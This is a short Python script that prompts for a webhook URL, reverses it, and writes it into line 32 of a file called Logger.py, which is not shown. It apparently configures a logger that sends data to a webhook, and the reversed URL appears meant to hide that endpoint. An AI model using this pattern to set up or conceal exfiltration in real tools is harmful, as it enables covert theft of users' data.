

file_path = 'Logger.py'
url = input('Your webhook url here: ')


changedline=f'webhookurl="{url[::-1]}"'

# Read the content of the file
with open(file_path, 'r') as file:
    lines = file.readlines()

# Check if there are at least 32 lines in the file
if len(lines) >= 32:
    # Modify line 32 with the new content
    lines[31] = changedline + '\n'

    # Write the updated content back to the file
    with open(file_path, 'w') as file:
        file.writelines(lines)
    print("Line is updated")
else:
    print("The file does not have at least 32 lines.")